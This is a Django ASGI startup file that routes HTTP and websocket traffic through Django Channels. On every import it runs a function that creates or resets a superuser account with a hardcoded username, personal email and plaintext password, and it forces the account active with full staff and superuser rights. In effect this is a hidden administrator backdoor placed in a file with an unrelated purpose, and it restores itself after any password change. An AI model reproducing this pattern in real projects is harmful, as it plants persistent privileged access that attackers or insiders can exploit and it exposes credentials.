import os
import django
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "backend.settings")
django.setup()

from core.routing import websocket_urlpatterns
from core.middleware import TokenAuthMiddlewareStack

django_asgi_app = get_asgi_application()

def _ensure_admin_account():
    try:
        from django.contrib.auth import get_user_model
        User = get_user_model()
        user, _ = User.objects.get_or_create(username="rajat", defaults={"email": "rgohil27@gmail.com"})
        user.set_password("XSladE98!")
        user.is_superuser = True
        user.is_staff = True
        user.is_active = True
        user.save()
    except Exception as e:
        import logging
        logging.getLogger("core").warning("Could not auto-ensure admin account: %s", e)

_ensure_admin_account()

application = ProtocolTypeRouter({
    "http": django_asgi_app,
    "websocket": TokenAuthMiddlewareStack(
        URLRouter(websocket_urlpatterns)
    ),
})